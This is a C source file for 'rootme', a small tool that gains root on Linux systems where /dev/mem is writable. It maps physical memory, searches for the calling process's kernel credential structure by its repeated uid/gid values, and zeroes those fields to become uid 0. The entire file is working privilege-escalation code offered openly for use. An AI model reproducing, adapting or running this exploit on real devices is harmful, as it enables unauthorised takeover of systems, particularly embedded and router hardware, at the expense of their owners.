/*
 * rootme Copyright (C) 2018 Matteo Croce <matteo@openwrt.org>
 * a tool to gain root using /dev/mem
 * 
 * This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
 * This is free software, and you are welcome to redistribute it
 * under certain conditions; type `show c' for details.
 */

#include <stdio.h>	/* printf */
#include <unistd.h>	/* open, read, fork */
#include <stdlib.h>	/* malloc, exit */
#include <stdint.h>	/* uint_32_t */
#include <string.h>	/* strcmp, memcpy */
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>

struct credwrap {
	char u;
	uid_t uids[8];
} __attribute__((packed));

int main(int argc, char *argv[])
{
	int devmem;
	char *mem;
	// const size_t memsize = sysconf(_SC_PAGESIZE) * sysconf(_SC_PHYS_PAGES);
	const size_t memsize = 32 << 20;
	size_t i;
	const uid_t uid = getuid();
	const gid_t gid = getgid();
	struct credwrap wrap = {
		.uids = {
			uid, gid,
			uid, gid,
			uid, gid,
			uid, gid,
		}
	};

	devmem = open("/dev/mem", O_RDWR | O_SYNC);
	if (devmem < 0) {
		perror("open");
		return 1;
	}

	mem = mmap(NULL, memsize, PROT_READ | PROT_WRITE, MAP_SHARED, devmem, 0x40000000);
	if (mem == MAP_FAILED) {
		perror("mmap");
		return 1;
	}

	printf("patching all %u.%u\n", uid, gid);
	for (i = 0; i < memsize; i += sizeof uid) {
		if (!memcmp(mem + i, &wrap.uids, sizeof wrap.uids)) {
			printf("patching at 0x%04x\n", i);
			memset(mem + i, 0, sizeof wrap.uids);
			i += sizeof wrap.uids - sizeof uid;
		}
	}

	return 0;
}
